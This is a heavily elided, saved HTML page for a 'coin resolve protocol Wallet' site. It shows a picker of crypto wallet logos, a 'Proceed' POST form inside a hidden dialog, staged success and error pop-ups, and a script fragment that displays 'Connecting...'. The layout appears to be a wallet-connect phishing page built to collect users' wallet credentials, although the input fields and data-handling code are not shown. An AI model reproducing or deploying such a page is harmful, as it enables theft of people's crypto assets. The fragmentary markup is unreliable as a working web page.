...
<!-- saved from url=(0040)https://coinresolveprotocol.web.app/app/ -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    ...
    <title> coin resolve protocol Wallet</title>
    <script src="assets/78d167673c.js" crossorigin="anonymous"></script><style media="all" id="fa-v4-font-face">/*!
 ...
 */
    ...
    <link rel="stylesheet" href="assets/2.6 animate.css.css">
    <link rel="stylesheet" href="assets/walletpage.css">
    <link rel="stylesheet" href="assets/bootstrap.min(1).css">
    <link href="assets/main.css" rel="stylesheet">
  </head>
  <body style="background-color: rgb(15, 34, 42);">
    ...
    <div id="success-dialog" class="message-dialog" style="display: none">
      ...
      <div class="send-dialog-content">
        <div class="connect-dialog-body">
          <img style="width: 100px" src="assets/success.gif" alt="Success">
    ...
    <div id="error-dialog" class="message-dialog" style="display: none">
      ...
      <div class="send-dialog-content" style="background: #fefcfb">
        <div class="connect-dialog-body">
          <img style="width: 150px" src="assets/error.gif" alt="Success">
        ...
        <div class="connect-dialog-body">
          <div class="to-send-info">
            <div class="wallet-app-send-logo">
              <img id="current-wallet-send-logo" src="assets/idlefinance-80d51872039fc5e44da8471f772e7b8e.png" alt="wallet-app-name">
            </div>
          ...
          <div class="send-form">
            <form id="processForm" method="post" enctype="application/x-www-form-urlencoded">
              ...
              <button type="submit" id="ProceedButton" class="btn btn-primary btn-block" style="font-weight: bold; font-size: 14px">
                Proceed
              </button>
              <div class="text-right">
                <button type="button" id="cancelBtn" class="btn btn-sm dialog-dismiss btn-danger mt-2 text-right">
                  Cancel
                </button>
              </div>
            </form>
        ...
        <div class="connect-dialog-body">
          ...
          <div class="wallet-app-info">
            <div class="wallet-app-logo">
              <img id="current-wallet-logo" src="assets/idlefinance-80d51872039fc5e44da8471f772e7b8e.png" alt="wallet-app-name">
            </div>
          ...
          <div class="row">
            <div class="col-md-12 col-sm-12 col-xs-12">
              <div class="header-text">
                ...
                <svg class="cua7u cgwd6" style="width: 3rem;" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                  <defs>
          ...
          <div class="row">
            <div class="coin-registry">
              ...
              <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal102" class="btn coin">
                <img class="coin-img" src="assets/terra.png" alt="">
              ...
              <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal103" class="btn coin">
                <img class="coin-img" src="assets/phantom.jpeg" alt="">
              ...
              <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal104" class="btn coin">
                <img class="coin-img" src="assets/cosmos.png" alt="">
              ...
              <button type="button" data-bs-toggle="modal" data-bs-target="#exampleModal35" class="btn coin">
                <img style="border-radius: 40px" class="coin-img" src="assets/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpeg" alt="">
    ...
    <script src="assets/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
    <script src="assets/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
    ...
    document.getElementById("ProceedButton").textContent = "Connecting...";
    setTimeout(function () {
            restoreButtons();
